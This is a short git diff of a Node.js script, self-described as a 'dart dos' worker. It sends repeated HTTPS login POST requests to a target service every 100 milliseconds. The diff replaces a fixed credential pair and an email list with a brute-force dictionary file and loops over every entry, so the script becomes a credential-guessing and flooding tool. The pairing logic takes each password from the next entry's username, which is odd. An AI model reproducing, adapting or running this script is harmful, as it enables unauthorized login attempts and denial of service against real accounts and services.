@@ -5,20 +5,19 @@ app.use(express.logger());
 var https = require("https");
 var querystring = require("querystring");
 var fs = require("fs");
-var emails = require("./emailList.json");
+var bdict = require("./brutefrc.json");
 //var process = require("process");
 
 var port = process.env.PORT || 5000;
 
 console.log("starting worker dart dos");
 var i = 0;
-var max = 1;
+var max = bdict.result.length;
 var delaytime = 100; //mins * secs * millisecs
 var idinterval = setInterval(function(){
-    //console.log(i++);
-    var emailTo = emails.result[i++].email
-    //console.log(emailTo+",iteration:"+i+",max:"+max);    
-    postDosToDart('turbocharger','fuckit');
+    var user = bdict.result[i++].username;
+    var pass = bdict.result[i].username;
+    postDosToDart(user,pass);
     if(i > max)
     {
         clearInterval(idinterval);
@@ -62,7 +61,7 @@ function postDosToDart(username,password)
     };
     var req = https.request(options,function(response) {
         console.log('STATUS: ' + response.statusCode);
-        console.log('HEADERS: ' + JSON.stringify(response.headers));
+        //console.log('HEADERS: ' + JSON.stringify(response.headers));
         response.setEncoding('utf8');
         response.on('data', function (chunk) {
         //console.log('BODY: ' + chunk);
